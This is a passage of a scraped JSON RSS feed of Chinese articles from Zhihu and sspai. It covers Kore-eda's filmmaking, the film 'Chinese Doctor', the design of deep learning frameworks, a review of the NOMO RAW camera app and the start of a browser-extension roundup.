几年的妻子无法用具体言语表达丈夫的丰功伟绩和高风亮节，却正因为她对丈夫的知之甚少和对家庭正向影响，才让我们感受到山内丰德自杀前可能存在的绝望，并非是一句言语、一项政治压力、一种生活方式、一种无能为力。</p>\n<p><strong>令他绝望的是这个暗黑的社会，越游走在上层，越被巨大编制的黑网所窒息，他想回到一线福祉工作，为当地人民做具体而有益的工作，然而，他明白回不去了，看到了整个政治体系的黑暗回避，一个螺丝钉有什么意义？</strong></p>\n<p>山内丰德是一个官员某一个角落的缩影，而文中对于水俣病真正的受害者们并没有加以悲惨的描述，一个站在受害者对立面，夹缝中的官员，细化到具体的人与事后，一切就给出一个具象而感性的答案。</p>\n<p>这种思维方式也同样体现在他的电影创作中，《无人知晓》电影里即使社会矛盾处处针锋相对，却从头至尾没有任何道德性的批判，即便是弃养小孩的母亲也没有被判罪。《小偷家族》里时时彰显着社会的弊病失衡，却从头到尾没有指责任何现实部门和政策。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c41f0494c76a066c3a4f1548bb94e11f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>是枝裕和说：<strong>电影不是用来审判人的，导演不是神也不是法官。坏蛋或许是用来让故事（世界）变得比较容易理解，但不用是否反而可以让观众将这个电影当成自己的问题带回日常生活中呢。</strong></p>\n<p><strong>写在最后：</strong></p>\n<p>是枝裕和出生于 1963 年，在百废待兴的祖国成长起来的一批人，见证了日本经济高速成长，经历过经济衰败，人性最大程度的变化。山内丰德是裹挟在政治官僚中的那个反抗者，是枝裕和是用艺术让人们安静地反思的反抗者。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a66ebb64efb3f42df6948c978411830a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>鲁迅先生曾经说过一句话<strong>：“真正的勇士敢于直面惨淡的人生，敢于正视淋漓的鲜血。”</strong>没有硝烟的战争，才需要更多人的探讨最核心最真实的问题，直面毒瘤，才有治愈的可能。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/21139901\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738045"},{"title":"如何评价电影《中国医生》？","date":"2021-07-13 23:07:23","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-a3d2b69f452484ca17e0c1edcaa155ed_l.jpg?source=8673f162\"><span>刘伟强，</span><span>香港知名导演刘伟强。</span>\n<a href=\"https://www.zhihu.com/question/448519150/answer/1994075480\" hidden>阅读原文</a>\n</div>\n<div>\n<p>从一开始我就知道，《中国医生》不是一个电影这么简单，这是我们大部分人的经历，要把这段经历拍成电影，是一个很大很大的挑战。</p>\n<p>我还记得疫情刚开始的时候，我每天都很慌，不能出门，工作也无法推进，就只能不停收集资料看资料，我们收集了三个多月的素材，包括影视资料和报纸杂誌等等，多到可以堆满一个房间的一整面墙。</p>\n<p>大概到了 2020 年 6 月底，我才出发去广州和鍾南山院士还有广东援鄂医疗队见面，其中就有桑岭，也是电影中陶峻这个角色的原型。他们带我们参观了很多医院，包括医院的 ICU 也带我们进去看，这个过程里，他们讲了很多抗疫的故事给我们。因为他们早在 2003 年就在广州对抗 SARS，有着非常丰富的经验。</p>\n<p>我在广州大概两周，见了很多人，收集了很多东西，然后就出发去了武汉。到武汉第一站就去了金银潭医院拜会张定宇院长，听他讲当时是如何面对疫情、如何收治病人、如何改造医院等等。还瞭解了当时很多援鄂的医生来到金银潭医院之后是怎么去帮助他们的，大家是如何分工的，他都会跟我们讲。这个过程中我和张涵予都发现了他的脾气，他是有脾气的。之前大家都觉得他身体不舒服，又是一个医院的院长，他一定很斯文很稳重，但并不是，他会骂人，但你知道他不是要骂你，他是要告诉其他人应该怎么做才是对的。所以我们后来也把这个性格保留下来放在了张竞宇的身上。</p>\n<p>演员的训练也是花了时间的。因为这是一部很专业的电影，有很多医生会看，所以一点错都不能出。我记得当时每天拍戏的时候，都有很多专家反覆检查拍完的素材，看哪里有错误。每天收工后，剧组就要开“批鬥大会”，一起批评我哪里拍得不对，哪里有很严重的问题必须要重拍，这种日子我过了两个多月，一开始是很难受的，作为一个成熟的导演，突然有很多人来批评你，心里很不爽，但后来渐渐觉得这是对的，是会让电影变得更好，所以就开心起来了。</p>\n<p>这个电影拍起来很不容易，演员演的时候也很难，因为大部分时间都不能露脸，只用眼睛来演戏，这个要很有功力才能做到。所以每个演员都很努力。我记得袁泉和朱亚文当时每天收工后都要去练习操作 ECMO、练习插管。每天他们穿着防护服拍戏，开工一小时后全身上下基本就湿透了。人大量出汗之后很快会虚脱，严重的还会中暑，但他们都扛下来了。我很佩服他们，也因此更佩服中国的医务工作者，因为当时的他们每天都是保持这样的状态去工作，他们比演员更辛苦。</p>\n<p>片名，最近声量也很大。其实这个问题我们一开始就讨论过，为甚么不叫《中国医护》？然后大家对此都有很多意见，最多的意见就是，首先，“医生”只是医疗系统的一个统称，比如我们生病去医院，我们都会说“去看医生”，这是普通人印象中的一个固有认知，你说“医生”，大家就知道他们在哪里，他们是做甚么的。其次，我们这是一部向中国医务工作者致敬的电影，那么医务工作者并不是只有医生和护士，还有药剂师，研究生物医学，护工，还有好多负责医院正常运营运转的工作人员，就是有很多工种，他们一起为抗击疫情做出了贡献，所以我们用“中国医生”来把所有人都放进去，就是告诉大家，所有为了抗击疫情做出贡献的人都是我们心中治病救人的白衣天使。就是出于这样的想法，才把片名定为《中国医生》。</p>\n<p>最近有些朋友告诉我，有些护士因为经历过那段很艰难的时期，所以不敢来看我们的电影，怕触景伤情，这一点我也很理解。我们在拍方舱医院那场戏的时候，现场有很多真正的护士也参演了，她们曾经参与过方舱的救助，除了参与演出之外也会来指导我们的工作。我记得她们看到我们拍摄的一些画面的时候，当场就哭了，因为勾起了她们的回忆。在此我也想向她们致敬，她们的付出和她们的位置是无法被取代和磨灭的，我们非常尊重每一位护士。除了护士，还有其他医务工作者在电影中也都有代表人物，我们没办法把所有人都放到电影里，但这部电影确实是献给你们所有人的。</p>\n<p>《中国医生》已经上映了，如果说这部电影要传递甚么样的资讯，我是希望大家能从中感受到力量。为甚么我们不怕疫情，是因为有医务人员挡在我们和疫情之间，是因为全体中国人在危急时刻可以站在一起共同面对。这是会让人瞬间充满勇气的，我们从来都不是一个人。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/448519150\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738034"},{"title":"关于深度学习框架的一些自己见解","date":"2021-07-13 13:15:08","description":"\n<p>上次写博客还是10多年前，然后还险些出现了事故，所以就一直没有写了。一晃就10几年过去了，虽然有时候看着一些知乎大咖（前同事等）在消费我们原来做的一些事情，很想回应几句，但是最后也是不了了之。最近团队一位知乎大咖去创业了，所以为了团队的建设，所以决定开始写写自己对于系统领域的一些感悟，也希望通过这个能够让大家更加理解我们团队，以及分享我本人对于系统的一些理解。纯属自己的观点，大家有不同观点，欢迎指正和讨论。</p>\n<p>我一直工作在分布式系统的领域，从大数据到AI工程，其实有不少做系统的我们这行的人，很多都有这个路径，所以第一篇就先聊聊自己一个感悟，说说最近做的深度学习框架，算是开一个头。</p>\n<p>我觉得做深度学习框架其实有两个派别的人，一派是从分布式系统的人来做的，另外一派是从做算法的人来做的。不同的人的背景不同，所以做这个事情的角度也会不同，从而产生不同门派。tensorflow属于系统派，而pytorch属于算法派。像我们这种做系统，特别是做过超大规模分布式系统的人，往往最担心的就是要对一个已经部署在成千上万台的计算集群上的平台软件需要做重大重构，这个中间困难没有做过这个事情的人可能不会太有体感，这么大一个平台，公司不可能财力让你能够去镜像一个集群去做任务的迁移，并且越大公司的平台上用户数众多，业务都会耦合在一起去完成公司的使命，基本上你不可能有时间点可以让全公司的业务团队放下他们自己手头的优先级来配合你做这种迁移，哪怕你工程能力非常强，这种迁移中间不会出现任何意外。何况很复杂系统要做到这一点基本上是很难的。所以我们做系统的，往往会把系统设计得更加具有可扩展性，从而尽最大可能去避免这种大的重构和推倒重来。当我们在面对需要构建一个深度学习框架的时候，我们第一时间就在设想这个框架需要能够从规模上很好支持分布式，能够很好的扩展到任意大的深度模型的框架，我们希望构建一个系统，能够像人脑一样能够把视觉，语音，语言等多种模型能够一同训练。其实这个就是tensorflow这样系统构造的时候的原始想法，把整个计算构成一个Tensor的Flow图。因为分布式本身就很复杂，需要处理各种节点相互的数据和执行中的各种依赖关系。这些事情由人来写代码，太繁琐且容易出错，所以自然地，我们就会设想由系统来负责这种依赖关系。这也就是为什么我们希望整个分布式执行的计划是一个静态图，然后系统再根据用户指定的或者系统智能的决定的placement进行分图，并在这些分图中添加合适的Send-Recv的Op从而构成一个分布式的执行计划。但是这样的设计理念也会带来一些困恼，我们在模型训练时候有时候有些类似控制图的部分，在这种设计理念下，我们必须要把这些控制流图的代码也op化，然后把这些op也整体串联在Tensor的Flow执行图中，大家有兴趣了解细节的话也可以看看我的老朋友也是前同事Yuan Yu写的文章：<a href=\"https://link.zhihu.com/?target=https%3A//arxiv.org/abs/1805.01772\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Dynamic Control Flow in Large-Scale Machine Learning, Eurosys2018.</a>  但是这种方式会使得一些习惯单机开发的研究人员觉得比较晦涩。同时也是因为分布式的原因，我们做系统的很自然会把模型的开发过程分成构图和执行两个阶段。构图的时候只是生成一个逻辑执行计划，然后通过显式方式的提交（或者execute）过程进行执行。这种方式让研究人员觉得不能一边写代码一边就能够马上看到代码片段的结果，所以这也造成很多人诟病TensorFlow的模式不太容易debug自己的模型程序，其实这也是因为分布式带来负担。但是也是因为TensorFlow是静态图的方式，其可以做到训推一体，在训练出来的模型能够导出模型图，并且在这个图上进行系统化的推理优化从而能够非常方便部署到线上。这个系统性化的方法带来另外一个优势。</p>\n<p>框架的另外一派是算法派，特别是感知类模型（图像，语音，语言类）训练，因为这类训练一般都是同步训练，然后“分布式训练”也不像前者那样设想是任意异构的分布式执行图（即每个分布式节点的执行逻辑可以不同），因为是数据并行，这样我们就可以利用MPI的AllReduce的通讯源语来进行梯度的汇集计算。算法同学需要是一种丰富的可扩展的在GPU上能够很好运行的，并且能够很好进行自动梯度的算子库，并且因为面向是数据并行的场景，这样话在神经网络部分其实都是单机程序，从而可以利用任何python的语法糖去构建任何的动态的训练控制逻辑（大家也把这种称作动态图），对于算法研究人员来讲，这种方式写代码比较随性也方便debug，所以在研究界pytorch得到大量的关注和使用。</p>\n<p>刚才说过TensorFlow从设计之初就在考虑可以超大的模型分布式训练的场景，但是没有预想到硬件的发展也非常迅速，显存越来越大以及训练技术的发展，还有非常精细化优化显存的工作，比如DeepSpeed等把optimizer所需要的显存sharding化掉，使得除了超大规模稀疏模型训练外，感知类的SOTA模型一直可以利用数据并行的方式来进行训练。从而使得TensorFlow这种设计理念看上去有overdesign的嫌疑。并且就算超大规模稀疏模型训练，因为TensorFlow整体化的设计理念，不把Parameter Server作为游离在Flow图之外，使得他在超大规模场景下的scalability上出现了问题，从而催生一堆自建PS+深度学习框架的（稀疏）模型训练框架。这是另外一个话题，我会在日后写一写在这个领域上我们一些工作。</p>\n<p>好在随着transformer的出现，我们终于有方法能够回归到最初那个梦想，使得我们可以把多种数据（视觉的，文字的）合在一起训练多模态的模型，因为问题规模的增大，必然需要更多参数的模型来支持，所以我们迅速将模型大小从几十亿增加到万亿规模，这个时候就必然需要能够支持很好模型并行框架，这也是为什么最近这个领域重新变得火热，比如类似OneFlow，MindSpore，PaddlePaddle，Mesh Tensorflow，GShard，以及我们阿里的Whale框架。</p>\n<p>其实从设计理念来看，模型并行正是回归到原来TensorFlow一开始设计时候的设想，只是那个时候因为模型并行的需求不够，没有必要提供比较好高层自动分布式的抽象，写模型的人还是可以自己精细化去构造每个计算节点的子图，整体上TensorFlow的框架只是负责把这些子图能够自动通过Send-Recv进行连接，并且在Runtime能够合法的进行计算。而现在，因为需求增多，算法迭代需求的增多，迫切需要一种高层次的自动分布式框架，从而使得算法同学能够去快速简单构造一个逻辑图的方式去构造自己神经网络，而由系统层来帮助他来进行复杂模型并行的构成。所以其实可以看到TensorFlow的设计理念正好就是为这个考虑的，利用静态图，我们可以逻辑性去描述一个网络训练，然后在执行时候在进行系统化的分图和分布式训练。所以说自动分布式的需求并没有超越原来设计的基本范畴，也是因为这样，我们采取和谷歌Gshard类似技术路线去提供自动分布式的能力。正是站在原有框架基础上去做增量。</p>\n<p>不同于GShard更加关注于谷歌TPU集群，我们关注于异构的GPU集群，这里所说异构是因为我们不如谷歌这么有钱，构建非常大的同构化TPU集群，我们集群中有不同年代的GPU和CPU，这些GPU各自算力和显存都大小不一。也正是因为这样，其实给我们系统提出更大挑战，我们在进行自动分布式时候需要在cost model上考虑好这些差异点。这样才能做到比较优化的分布式训练。这也是我们自动分布式框架Whale一种差异性和核心能力之一。</p>\n<p>其实系统派的框架和算法派的框架也在进行一定的融合，TensorFlow提出了Eager模式，通过TF.function在eager模式下可能单步执行计算，得到Tensor来提高可调式性；而Pytorch通过Trace或者Parse的方式转化为TorchScript的图描述，从而能够更好支持训练到推理的工程化。但是这种动静结合其实只是在一定层次的，比如如果考虑分布式，Trace的方式去得到TorchScript就不足够。需要进一步去限制构图能够使用的API，这也是像NV的megatron以及微软DeepSpeed在Pytorch上去支持分布式所带来的一些约束，感兴趣的可以读读OneFlow的Blog：《<a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/IN281OPUEOI12ge3hOvvTw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GPT-3难以复现，为什么说PyTorch走上了一条“大弯路”？”》</a></p>\n<p>总结下我的观点：我觉得现在深度学习框架主要流行的两个TensorFlow和Pytorch是有其设计理念的原因的。我们做Whale正是在这种理解的基础上进行路线选择，并且认为应该站在已有的工作基础上去做增量的东西。而不是再去造一个别人做过的轮子。接下来我还陆续展开我们分布式框架Whale，大规模稀疏模型训练工作，编译系统Ansor和DISC，以及我们如何把分布式，编译和调度有机结合方面一系列系统工作，敬请关注。如果大家对于我们PAI团队的工作有兴趣，非常欢迎和我们联系，我的邮箱是weilin.lw@alibaba-inc.com</p>\n<p>PS：写Blog写的不多，还需要多训练，感觉有点虎头蛇尾的，呵呵。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/backom?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">backom</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/375634204?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"功能强大也能轻松上手，它想成为你的 iPhone 默认相机：NOMO RAW","date":"2021-07-13 09:30:00","description":"\n<p>在过去几年中，凭借操作手感与仪式感兼具的拟物设计，以及对几十款相机成像效果与独特色彩的优秀还原，NOMO 已然是手机影像创作者们最常使用的摄影应用之一，甚至成为了很多普通用户转向摄影爱好者的「入坑」工具。</p>\n<p>就在 7 月份，NOMO 团队在将原应用更名为 NOMO CAM 后，又顺势推出了一款定位于专业摄影的相机应用：NOMO RAW。经过一段时间的使用，我想通过这篇文章向你介绍这款全新的 NOMO 系列 App 的功能和使用体验。</p>\n<h2>操作逻辑与界面设计，自然而然</h2>\n<h3>峰值对焦与曝光补偿</h3>\n<p>虽说定位专业，但 NOMO RAW 的界面设计却相当简单，与拍摄最直接相关的两项参数设定：曝光补偿（调节画面明暗）与对焦点调整以滑动交互的形式放在了取景框的左右两边，单手即可进行操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/8612f55f89a235bb98909f64e64e837d.gif\"></figure><p>对焦点调整则自带峰值对焦与小窗放大两项辅助功能，如下方样张中的左图，在滑动左侧的交互区时，取景框右下角将会出现辅助小窗，焦平面内的拍摄对象会被高亮的绿色标记，方便用户进行精准对焦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/dcfa898bd4d36d936e96ea7a87afdda2.jpg\"><figcaption>通过调整焦点位置使鳄鱼的眼睛在焦平面内</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/829cd3dfacffc7863e416200dcd05fa0.jpg\"><figcaption>这一张则是选择对焦在植物的果实上</figcaption></figure><h3>选择固定焦段进行拍摄</h3>\n<p>在 NOMO RAW 中，原生相机中可以任意调整焦段的渐进式变焦被舍弃，只能使用机身镜头本身的焦段进行拍摄，牺牲了原先可以任意变焦的便利。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/4eeff57076dc0b5bcf5c2c25d5e89b75.jpg\"><figcaption>在 iPhone 12 Pro Max 上使用 NOMO RAW 可调用的 3 个焦段：13mm、26mm、65mm</figcaption></figure><p>但从专业摄影角度出发，使用镜头本身的焦段进行拍摄在成像质量上是最优的。与此同时，这会强迫拍摄者「行动起来」，去接近或远离拍摄对象，某种程度上可谓一种取景的训练，提高在不同拍摄场合中对画面的把握，同时锻炼对拍摄距离的控制，这其实也是我个人会建议初学者多使用定焦镜头的首要原因。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/bad486c93f5f7c075db6733f54ed084f.gif\"></figure><h3>滑动调整白平衡</h3>\n<p>白平衡调节的交互区域在取景框下方，同样可以单手滑动调整，但我个人习惯性使用默认的自动白平衡，除开特殊场合中需要使用偏色的主色调以营造某种氛围，比如红蓝对比、暖色的陈旧感或者傍晚的冷蓝色等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/6c4a6f3c1b0c50988bc3b85be2667407.jpg\"><figcaption>通过调整白平衡营造的冷暖对比效果</figcaption></figure><h3>水平辅助与直方图</h3>\n<p>NOMO RAW在拍摄界面的下方设置了一键开启九宫格功能，同时带有水平辅助框，在拍摄过程中若中心的框呈现红色，则代表此时的构图居于水平，可以按下快门了，在建筑摄影或者城市摄影中很是方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/be16e7e2cbb07232b049ec7d22d3f753.jpg\"></figure><p>当然九宫格也能助于一些基础构图方式的践行，比如三分线构图、中心构图等等，此处就不多做展开。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/d6a08808dbf80493f88645ecfdb14f76.gif\"><figcaption>调整水平的过程中，画面上的辅助框会与震动马达联动</figcaption></figure><p>当使用手机进行类似 layout 摄影的垂直向拍摄时，水平辅助会变成一个小圆圈，当与中心圆重合时呈红色，此时即为完全垂直：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/0336fb9f6ca98055a30eadca00cc9be3.jpg\"></figure><p>NOMO RAW也允许用户即时预览当前画面的直方图，方便创作者把握整张照片的亮度分布：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/4fc73a97fbd3546fd799813b95ed1657.jpg\"></figure><h2>专业图像处理，无需操心</h2>\n<p>NOMO RAW 的界面设计与操作逻辑很好地照顾了用户直觉，在使用过程中一切都很自然，如此低的学习成本很大一部分得益于其将复杂的图像处理过程「隐藏」了起来，而这却是我个人认为这款拍摄应用最让人惊喜的部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/e42f9dc77ed7cc5f8c6f33aea7fbeb4e.jpg\"><figcaption>左图：室内的暗光环境与极易造成色彩溢出的光线环境 | 右图：晴天强光下的白色建筑</figcaption></figure><p>NOMO RAW 默认开启 HDR，并且允许用户存储 Apple ProRAW 格式的照片，配合内置的多种色彩方案以及成像上的算法优化，通过 NOMO RAW 拍摄的成片在色彩过渡上相当自然，高光与阴影部分在保留细节的同时避开了过度锐化造成的观感怪异，用一个词形容其直出效果，就是「舒服」。你甚至能在用手机进行创作类的拍摄时用它来代替原生相机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/12cec8b906a22507862c91a01d48e6a6.jpg\"></figure><p>需要注意的是，Apple ProRAW 格式存储功能仅对 iPhone 12 Pro 和 iPhone 12 Pro Max 两款机型开放，且要求系统版本在 iOS 14.3 或以上。不过对于日常使用或者记录生活，考虑到机身存储空间的限制，我们可以在 NOMO RAW 中选择关闭，或者在设置中对压缩程度进行调整。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/8870034cd371294edb06a9ed65e2bdc3.jpg\"></figure><h2>即时预览的色彩方案</h2>\n<p>之前的 NOMO CAM 或许是对胶片时代的纪念与复兴，而如今推出的 NOMO RAW 则把重心放在了几款时下热门的专业相机上，对其标志性的视觉风格进行还原。NOMO RAW 目前除了默认的色彩方案，还内置了另外九款相机的「预设」，在拍摄中可以实时预览：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/235f6155126b67b369b837a6293cc15d.gif\"></figure><p>具体的色彩方案与对应机型品牌如下：</p>\n<ul>\n<li>L：M10LC （Leica）</li>\n<li>M：M10 Standard（Leica）</li>\n<li>R：R5 Auto（Canon）</li>\n<li>A：α7 Standard（Sony）</li>\n<li>P：X100V Provia（Fujifilm）</li>\n<li>C：X100V C-Chrome（Fujifilm）</li>\n<li>G：GR III Hi-BW （Ricoh）</li>\n<li>H：GR III Hard-BW（Ricoh）</li>\n<li>B：X100 Acros（Fujifilm）</li>\n</ul>\n<p>L（M10LC）和 M（M10 Standard）这两款色彩方案都源自于徕卡，在 NOMO RAW 中调用 L&amp;M 能很明显的感受到整个画面的亮度降低，同时色彩减淡，L（M10LC）的整体色彩更平滑，对比度相较于 M（M10 Standard）会更低，但 M（M10 Standard）会有种「聚焦」的感觉，适合拍摄画面中有较明显重点的画面。</p>\n<p>L（M10LC）在降低整体画面影调的同时也做了减淡，是某种清冷的高级感</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/9caba0b0f9c73047230063292ae013e8.jpg\"></figure><p>M（M10 Standard）尤其适合暗光环境中有某一处明亮色彩的画面，能更好的突出「亮点」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/4324fd7073ff927fc720d4d5a07e0acb.jpg\"></figure><p>R（R5 Auto）加持下的画面在还原真实色彩的同时，在色彩和质感上更为讨喜，并且对于暖色调尤其照顾，个人推荐在人像拍摄与美食摄影、甚至是在大部分日常场景下优先使用这一色彩方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/3b49105a87a32b68a0ace41e45cd8742.jpg\"></figure><p>A（α7 Standard）来源于一直以来都相当热门的 Sony α7 系列微单，视觉效果上也延续了「清亮」的特点，个人观察，A（α7 Standard）对于画面中的白色部分会做适当提亮，并对亮部颜色做了些许压制，相较于 R（R5 Auto）对比会更强烈，或许能在街头摄影或建筑摄影中营造某种高级感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/8abfc536f3b7fdd6811e1f51e16d2e9b.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/a5b36c27ee49b62c80aff63e202c18c9.jpg\"><figcaption>A 色采方案样张</figcaption></figure><p>P（X100V Provia）与 C（X100V CLASSIC CHROME）取材于富士便携专业相机 X100V 的内置色彩方案，两者在成像风格上的共同点是在轻微减暗的基础上又做了色彩上的减淡甚至是某种「冷感」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/bccb070c5cf6f1e552bbf5a870a254ba.jpg\"></figure><p>剩下的三款视觉方案都是黑白类型，G（GR III Hi-BW）和 H（GR III Hard-BW）来自于理光，而 B（X100 Acros）来自于富士，这里用一些样张直观对比三者在黑白风格上的差异：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/e18cf2f4e93b4f228ec14523cb218bc5.jpg\"><figcaption>同一场景下三种黑白视觉风格的直观对比</figcaption></figure><p>能很明显的看出 G（GR III Hi-BW）拥有相当高的对比，画面中的亮部被提亮，暗处则进一步下沉，属于视觉风格更为激进的一种黑白；H（GR III Hard-BW）整体风格比较均衡，对暗部进行了提亮，对亮部进行了压制，使得画面感比较「平」；B（X100 Acros）则中规中矩，提亮的程度并没有那么极端，同时有某种厚重银盐的质感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/680268bd160d7e5045fee5258d3d7da6.jpg\"><figcaption>使用 G（GR III Hi-BW）效果直出的隧道几何</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/cab7e9e8b5414bd61dc855ff39dea757.jpg\"><figcaption>使用 B（X100 Acros）效果直出的黑天鹅与建筑局部</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/5a89b8eb98386bdcc0c5bbc6726f3b9c.jpg\"><figcaption>使用 H（GR III Hard-BW）效果直出的日常建筑</figcaption></figure><h2>像使用相机一样创作</h2>\n<p>总结而言，NOMO RAW 提供了一种可能：即把手机变成便携的「专业相机」，加强照片观感的同时，为手机影像创作带来更多潜力。用户甚至可以不单单止步于使用内置的色彩方案「直出」照片，而选择更好地利用其 16-Bit 图片处理全流程和 Apple ProRAW 格式相片，使用更加专业的图像处理应用进一步后期你的作品，就像使用相机一样进行摄影创作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/7515a7c85d734ed428eb0322c6d696f8.jpg\"><figcaption>使用 NOMO RAW 直出的日常照片</figcaption></figure><p>对我个人而言，除了在非常随意的拍摄场景下，比如拍快递单号、书的某个段落或笔记，甚至是帮家人带零食的时候拍拍货架上的东西之类的场景，在大部分「可能也是某种创作」的场景中，都会愿意使用 NOMO RAW 代替原生相机记录日常，正如之前的 NOMO CAM 或许让更多人爱上了摄影或者日常记录，NOMO RAW 或许可以成为这些用户走向专业的第一步。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/nomo-raw-%E4%B8%93%E4%B8%9A-proraw-%E7%9B%B8%E6%9C%BA/id1572429540\" target=\"_blank\">App Store</a> 下载 NOMO RAW，年订阅价格 63 元，<a href=\"https://sspai.com/app/NOMO%20-%20%E4%BD%A0%E7%9A%84%E6%8B%8D%E7%AB%8B%E5%BE%97\" target=\"_blank\">NOMO CAM</a> 订阅用户可以免费获取 NOMO 系列应用，订阅价格 188 元。</p>\n<span class=\"ss-application\" app-id=\"16098\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67661"},{"title":"它们和你的浏览器更配：9 款值得一试的扩展插件","date":"2021-07-13 08:03:30","description":"\n<p>距离少数派上次推荐浏览器扩展又过去了一段时间，Chrome 和 Edge 你追我赶体验渐入佳境的同时，Firefox 这边也发布了 <a href=\"https://sspai.com/post/66984\" target=\"_blank\">四年以来的最大更新</a>。而作为浏览器核心体验之一，浏览器扩展在过去这段时间里又有哪些值得关注的「新玩意」呢？</p>\n<p>本文搜罗了 9 款近期上线或有重要更新的浏览器扩展，如果你感兴趣不妨也下载试试。</p>\n<h2>Tab Cola：新标签页的夏日 ASMR</h2>\n<p>炎炎夏日来袭，无论在烈日当空的室外、人心躁动的办公室还是深夜伏案疾笔的案前，一口满溢着气泡与冰凉的「快乐水」，一定能让我们为之振奋。</p>\n<p>只要有一台可以打开浏览器的电脑、不用担心糖分，Tab Cola 这款插件也可以帮你过一把无实物的可乐瘾。安装插件后，打开新标签页的同时浏览器就会播放一段能让「快乐水」爱好者们心满意足的音效 —— 拉开罐装可乐拉环的声音，同时伴随着些许碳酸气泡窜出来的爽快。</p>\n<p>这款快乐水 ASMR 的美妙程度或许会与天气炎热程度成正比，建议搭配「三伏天」食用。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/13/article/b48b846ffb891885561cf929e76202d0\"><figcaption>来杯 Tab Cola 吧</figcaption></figure><p>你可以在 <a href=\"https://chrome.google.com/webstore/detail/tab-cola/icdphajhndamimeleigndjlofmcpgjho/\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Tab Cola。</p>\n<h2>Tab with A view：给想要说走就走的你</h2>\n<p>针对标签页面的插件之前还介绍过不少，如主打效率的 Infinity，简洁大气的几枝、小川，实用性与美观性兼具 Momentum 等。所以如果比起音效你更想要视觉上的片刻放松，Tab with A view 也是个不错的新选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/b113e70c904bb3871d089b0856d4e978.png\"></figure><p>Tab with A view 会在每次打开新标签页时随机展示世界上任意一处的景色，仔细探索页面内容就不难发现，除了让你看看美景之外，Tab with a View 也提供方便你前往图中地点的相关信息，包括线上虚拟参观、签证信息、航班路线、票务查询……甚至还有目的地的新冠疫情统计数据。</p>\n<p>Tab with A view 每天会为我们准备 30 个好去处用于参考，如果你所在的地方风景如画，也可以自行拍照上传照片，说不定地球上某个地方正在用这款浏览器扩展的朋友觉得不错也想来看看呢？</p>\n<p>你可以在 <a 